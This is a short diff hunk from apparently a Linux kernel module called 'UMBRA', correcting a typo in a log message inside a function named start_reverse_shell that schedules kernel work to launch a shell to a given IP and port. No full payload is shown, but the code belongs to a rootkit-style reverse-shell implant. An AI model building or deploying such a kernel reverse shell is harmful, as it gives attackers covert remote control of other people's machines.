@@ -51,7 +51,7 @@ int start_reverse_shell(char* ip, char* port){
 
     err = schedule_work(&params->work);
     if(err<0){
-        printk(KERN_INFO "UMBRA:: Erro scheduling work of starting shell\n");
+        printk(KERN_INFO "UMBRA:: Error scheduling work of starting shell\n");
     }
     return err;
 
